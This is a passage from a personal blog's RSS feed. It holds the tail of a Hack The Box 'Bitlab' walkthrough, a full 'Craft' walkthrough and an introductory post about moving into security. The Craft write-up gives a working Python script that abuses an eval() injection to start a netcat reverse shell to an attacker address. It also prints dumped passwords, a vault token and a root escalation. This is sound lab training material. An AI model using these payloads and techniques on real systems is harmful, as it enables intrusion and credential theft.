<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
</code></pre></div><p>Before trying to crack the password, we try to use as it is, and indeed it was just that one it was not encrypted!</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
</code></pre><p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>
<p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>
<p>Until nex write up!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Craft</title>
            <link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link>
            <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid>
            <description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description>
            <content type="html"><![CDATA[
    <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="quick-summary">Quick Summary</h2>
<p>So!!
Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href="https://www.hackthebox.eu/profile/103596">@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p>
<p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p>
<p>Said that, let&rsquo;s start with the real write up!</p>
<h2 id="nmap">Nmap</h2>
<p>We start running nmap to scan for open ports and services:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
Nmap scan report for 10.10.10.110
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
</code></pre><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>
<h2 id="web-enumeration">Web enumeration</h2>
<p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p>
<p>
    <img src="/images/htb/craft/1-web-enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-web-enum.png"  class="center"  style="border-radius: 8px;"  />

</p>
<p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p>

    <img src="/images/htb/craft/1-api.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-api.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/3-api.png"  class="center"  style="border-radius: 8px;"  />


<p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p>

    <img src="/images/htb/craft/1-gogs.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-gogs.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/3-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p>
<p>We jump into the repository, and start looking if we can find something.</p>

    <img src="/images/htb/craft/4-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p>

    <img src="/images/htb/craft/5-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p>

    <img src="/images/htb/craft/6-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p>

    <img src="/images/htb/craft/7-gogs.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="rce">RCE</h2>
<p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
import json

url = &quot;https://api.craft.htb/api/auth/login&quot;
login=('dinesh', '4aUh0A8PbVJxgd')
r = requests.get(url, auth=login, allow_redirects=False, verify=False)
token = json.loads(r.text)['token']
print(token)
url = &quot;https://api.craft.htb/api/brew/&quot;
headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&quot;)&quot;&quot;&quot;
payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
payload = json.dumps(payload)
attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
</code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
<pre><code class="language-console" data-lang="console">/opt/app # cd /root
/root # ls -la
total 12
drwx------    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
drwx------    1 root     root          4096 Feb  9  2019 .cache
/root # 
</code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
drwx------    1 root     root          4096 Feb  9  2019 root
drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
/opt/app # ls -la /usr/bin
total 13236
drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -&gt; 2to3-3.6
-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -&gt; /bin/busybox
lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -&gt; gcc
lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
</code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
<pre><code class="language-console" data-lang="console">/opt/app # ls -la
total 32
drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
/opt/app # grep -ir '\(pass\|password\|passwd\)' *       
app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
craft_api/database/models.py:    password = db.Column(db.String(80))
craft_api/database/models.py:    def __init__(self, username, password):
craft_api/database/models.py:        self.password = password
craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
/opt/app # 
</code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = &quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
/opt/app #
</code></pre><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>

    <img src="/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />


So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
</code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
/opt/app # python dbtest.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
/opt/app # 
</code></pre><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>

    <img src="/images/htb/craft/1-gil.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-gil.png"  class="center"  style="border-radius: 8px;"  />


<p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>

    <img src="/images/htb/craft/3-gil.png"  class="center"  style="border-radius: 8px;"  />


<p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
gilfoyle@craft:~$ id
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
gilfoyle@craft:~$ wc -c user.txt 
33 user.txt
</code></pre><h2 id="root">root</h2>
<p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       [&quot;root&quot;]
identity_policies    []
policies             [&quot;root&quot;]
gilfoyle@craft:~$ 
</code></pre><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:

    <img src="/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />


with this information we run vault to get the kv if the secret is indeed there:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
========== Data ==========
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
</code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
We check what options vault provides to use it:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
Usage: vault &lt;command&gt; [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
gilfoyle@craft:~$ vault ssh -h
Usage: vault ssh [options] username@ip [ssh options]

  Establishes an SSH connection with the target machine.

  This command uses one of the SSH secrets engines to authenticate and
  automatically establish an SSH connection to a host. This operation requires
  that the SSH secrets engine is mounted and configured.

  SSH using the OTP mode (requires sshpass for full automation):

      $ vault ssh -mode=otp -role=my-role user@1.2.3.4

  SSH using the CA mode:

      $ vault ssh -mode=ca -role=my-role user@1.2.3.4

  SSH using CA mode with host key verification:

      $ vault ssh \
          -mode=ca \
          -role=my-role \
          -host-key-mount-point=host-signer \
          -host-key-hostnames=example.com \
          user@example.com

  For the full list of options and arguments, please see the documentation.
</code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256


.   *   ..  . *  *
*  * @()Ooc()*   o  .
  (Q@*0CG*O()  ___
 |\_________/|/ _ \
 |  |  |  |  | / | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | \_| |
 |  |  |  |  |\___/
 |\_|__|__|_/|
  \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
root@craft:~# wc -c root.txt
33 root.txt
root@craft:~# 
</code></pre><p>And we own root!!
Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
<p>Thanks a lot for reading, and until the next write-up.</p>
]]></content>
        </item>
        
        <item>
            <title>shutdown -r now</title>
            <link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link>
            <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid>
            <description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;quot;, currently that mindset has been changing.</description>
            <content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
<p>I have always been thinking about writing a blog, but my mindset has always been the same &ldquo;me? a blog? what am I supposed to post! I can&rsquo;t even think anything I could share with people, I don&rsquo;t know nothing compared to the people
who blogs!&quot;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>
<p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
So far in this aprox. 5 years, I meet really nice people (as also not), and make really really nice friends, and of course been learning quite a lot of stuff, but&hellip;there is something that since I started I been avoiding (Programming), and something I&rsquo;ve been looking forward to learning it but thinking I can&rsquo;t do it (Security), these two things have been chasing me for a longg longg time (at the point of making me feel a bit depressed).</p>
<p>As I mentioned above, it&rsquo;s been around 9 months since I moved abroad (arrived in the Netherlands at ends of Apr. 2019), of this 9 months I spend 6 months in bench, without a project to work it (yes, getting my salary, but being anxious as I&rsquo;m, makes you to feel some panic when you get a paid for not doing nothing, even if you are studying), in this months I had a lot of time to think about myself, my career, what I wanted to do in the future, do I like to be a DevOps &ldquo;for all my life&rdquo; (today is devops, tomorrow who knows being as how IT works, so is just for saying it in a way), so&hellip;I started to study/practice with the book &lsquo;How to Design Programs&rsquo; (HtDP), even feeling I&rsquo;m going slow looking backwards and comparing to now, I think even if I still haven&rsquo;t finished, it indeed has been allowing me to grow.
Now&hellip;great, but, what about security? Is still there, and I really would like to start doing stuff NOW (I&rsquo;m more a learn-by-doing person), and not wait until get all my way through a designing programs book, combined with my thoughts of &ldquo;I can&rsquo;t do Sec. without coding/I can&rsquo;t even imagine being breaking stuff without deep understanding of data-types, algorithms&rdquo;, I was getting nowhere, so I decided to try to re-program that mindset of mine, that results in me exchanging words with friends about it, talking with people who are currently into sec, and so far was an excellent idea&hellip;thanks to that now I know coding is not needed (as in mandatory) but it helps a lot to at least being able to write scripts, understand the workflow of exploits and modify them, like other things, and&hellip;that&rsquo;s something I CAN DO (and have to experience in it).</p>
<p>Said that now my goal is to jump into the Sec. field, I started to play with boxes in HTB and reading some books, this has allowed me to set my first checkpoint: getting the OSCP cert, not for the cert itself, but more for the challenge and some compensation-ish for not having experience into sec.
Once getting the OSCP, I will come back to the HtDP to polish my programming skills (or why not, also try to keep it in parallel?), and keep climbing (I love rock climbing/bouldering, so I could use a lot of metaphors from it!) my way up to the tops, trying to not compare me with other people, enjoying the route, and learning from all my falls; a fight between me and me.</p>
<p>I will use this space to post walk-throughs in some HTB boxes, blog some thoughts once in a while (like this post itself), stuff in my path of also learning Dutch, etc.</p>
<p>So far so good, keep learning and never stop doing it.</p>
]]></content>
        </item>
        
    </channel>
</rss>
